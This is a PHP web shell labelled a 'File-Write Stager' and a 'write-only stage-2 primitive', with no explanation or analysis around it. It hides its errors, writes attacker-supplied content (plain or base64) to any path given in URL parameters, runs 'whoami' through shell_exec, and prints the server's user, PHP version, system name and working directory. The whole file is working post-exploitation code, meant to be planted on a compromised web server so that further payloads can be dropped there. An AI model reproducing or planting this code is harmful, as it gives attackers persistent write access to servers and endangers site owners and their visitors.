<?php
@error_reporting(0);
$T="25 File-Write Stager";
$M="M25-WRITEOK";
$ok=true;
$out="";
$p=isset($_GET['p'])?(string)$_GET['p']:'';
$d=isset($_GET['d'])?(string)$_GET['d']:'';
if($p!==''){ $bin=@base64_decode($d); if($bin===false||$d===''){$bin=$d;} $w=@file_put_contents($p,$bin); $out.=($w===false?'WRITE-FAIL '.$p:'WRITE-OK '.$w.'B -> '.$p); }
else{$out.="p=dest path, d=content (plain or b64)";}

$si='';
$u=@trim((string)@shell_exec('whoami'));
$si.=($u!==''?htmlspecialchars($u):'(no shell_exec)').' | '.@phpversion().' | '.@php_sapi_name().' | '.@htmlspecialchars((string)@php_uname());
$cwd=@getcwd();
$si.=' | cwd='.($cwd!==false?htmlspecialchars($cwd):'n/a');
$S=(string)@$_GET['language'];
$faction=($S!==''?'?':'#');
$hid=($S!==''?'<input type="hidden" name="language" value="'.htmlspecialchars($S).'" /><input type="hidden" name="action" value="go" />':'');

echo '<div style="font-family:Consolas,monospace;font-size:13px;background:#101418;color:#e8e8e8;border:1px solid #3a6ea5;border-radius:6px;padding:10px;margin:8px 0;max-width:1200px;overflow:auto">'
  .'<div style="border-bottom:1px solid #3a6ea5;padding-bottom:6px"><b style="color:#7ce38b">'.$T.'</b> <span style="color:#f6c453">['.$M.']</span> '
  .($ok?'<span style="color:#7ce38b">GATE:OK</span>':'<span style="color:#ff7b72">GATE:LOCKED</span>')
  .'<div style="color:#9aa4af;font-size:12px;margin-top:4px">'.$si.'</div></div>'
  .'<form method="get" action="'.$faction.'" enctype="multipart/form-data" style="margin:8px 0">'.$hid
  .'<table><tr><td>path</td><td><input type="text" name="p" size="44"></td><td>data(b64)</td><td><input type="text" name="d" size="44"></td><td><input type="submit" value="write"></td></tr></table><div style="color:#9aa4af;font-size:11px">write-only stage-2 primitive - NO exec surface, NO data read-back</div>'
  .'</form>'
  .'<pre style="background:#0b0e11;border:1px solid #22303f;color:#d6e2ff;padding:8px;border-radius:4px;overflow:auto;margin:0">'.htmlspecialchars($out).'</pre>'
  .'</div>';
?>
